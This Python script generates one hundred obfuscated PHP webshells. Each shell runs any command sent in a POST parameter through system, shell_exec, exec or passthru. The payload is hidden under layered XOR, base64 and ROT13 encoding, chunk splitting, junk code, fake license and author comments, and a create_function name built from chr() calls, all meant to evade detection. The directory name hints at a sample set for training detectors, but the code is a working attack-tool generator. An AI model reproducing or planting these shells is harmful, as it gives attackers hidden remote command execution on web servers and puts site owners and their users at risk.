import os
import random
import base64
import string
from pathlib import Path

OUTPUT_DIR = Path("/data/php_webshellv11")
KEY = "secret"

OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

def rot13_encode(data):
    return data.translate(str.maketrans(
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
        'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
    ))

def xor_encode(data, key):
    return ''.join([chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data)])

def xor_encode_base64(data, key):
    xor_bytes = xor_encode(data, key).encode()
    return base64.b64encode(xor_bytes).decode()

def generate_random_var(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def generate_dynamic_names():
    func_names = ['system', 'shell_exec', 'exec', 'passthru']
    var_names = ['cmd', 'command', 'input', 'data']
    return random.choice(func_names), random.choice(var_names)

def generate_junk_code():
    lines = []
    for _ in range(random.randint(5, 10)):
        var = generate_random_var()
        val = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 15)))
        lines.append(f"${var} = '{val}';")
    return '\n'.join(lines)

def generate_junk_comments():
    comments = [
        "// This is a normal comment",
        "/* Regular code block */",
        "// TODO: Fix this later",
        "/* Debug information */",
        "// @author: John Doe",
        "/* Version: 1.0.0 */",
        "// Copyright (c) 2023",
        "/* License: MIT */"
    ]
    return random.choice(comments)

def split_code(code, chunk_size=3):
    parts = []
    for i in range(0, len(code), chunk_size):
        parts.append(code[i:i+chunk_size])
    return parts

def build_webshell(index):
    php_open = "<?php"
    php_close = "?>"
    
    # 伪装 include 文件
    normal_file_name = f"normal_{index}.php"
    with open(os.path.join(OUTPUT_DIR, normal_file_name), 'w') as f:
        f.write("<?php\n$dummy = 'clean';\n?>")

    # 动态选择函数名和变量名
    func_name, var_name = generate_dynamic_names()
    
    # 实际 payload
    payload_code = f"${var_name} = $_POST['qaxniubi']; {func_name}(${var_name});"
    
    # 多层编码
    encoded_payload = payload_code
    for _ in range(3):  # 多次编码
        encoded_payload = xor_encode_base64(encoded_payload, KEY)
        encoded_payload = rot13_encode(encoded_payload)
    
    # 代码分割
    code_parts = split_code(encoded_payload)
    encoded_parts = [xor_encode_base64(part, KEY) for part in code_parts]
    
    junk_code = generate_junk_code()
    junk_comments = generate_junk_comments()
    
    shell = f"""
{php_open}
{junk_comments}
@include '{normal_file_name}';
{junk_code}
function XORDecode($s, $k) {{
  $o = '';
  for($i=0; $i<strlen($s); $i++) {{
    $o .= chr(ord($s[$i]) ^ ord($k[$i % strlen($k)]));
  }}
  return $o;
}}

function rot13_decode($s) {{
  return str_rot13($s);
}}

$k = '{KEY}';
$parts = {encoded_parts};

// 重组代码
$p = '';
foreach($parts as $part) {{
    $p .= XORDecode(base64_decode($part), $k);
}}

// 多层解码
$d = $p;
for($i=0; $i<3; $i++) {{
    $d = rot13_decode($d);
    $d = XORDecode(base64_decode($d), $k);
}}

// 动态函数名
$f1 = chr(99); // c
$f2 = chr(114); // r
$f3 = chr(101); // e
$f4 = chr(97); // a
$f5 = chr(116); // t
$f6 = chr(101); // e
$f7 = chr(95); // _
$f8 = chr(102); // f
$f9 = chr(117); // u
$f10 = chr(110); // n
$f11 = chr(99); // c
$f12 = chr(116); // t
$f13 = chr(105); // i
$f14 = chr(111); // o
$f15 = chr(110); // n
$fn = $f1.$f2.$f3.$f4.$f5.$f6.$f7.$f8.$f9.$f10.$f11.$f12.$f13.$f14.$f15;

// 执行代码
$fn('', $d)();
{php_close}
"""
    return shell

def generate_webshell_samples(n):
    for i in range(n):
        shell_code = build_webshell(i)
        path = os.path.join(OUTPUT_DIR, f"adv_webshell_{i}.php")
        with open(path, 'w') as f:
            f.write(shell_code)
    print(f"Generated {n} advanced PHP WebShells in {OUTPUT_DIR}")

def main():
    num_samples = 100
    generate_webshell_samples(num_samples)

if __name__ == "__main__":
    main() 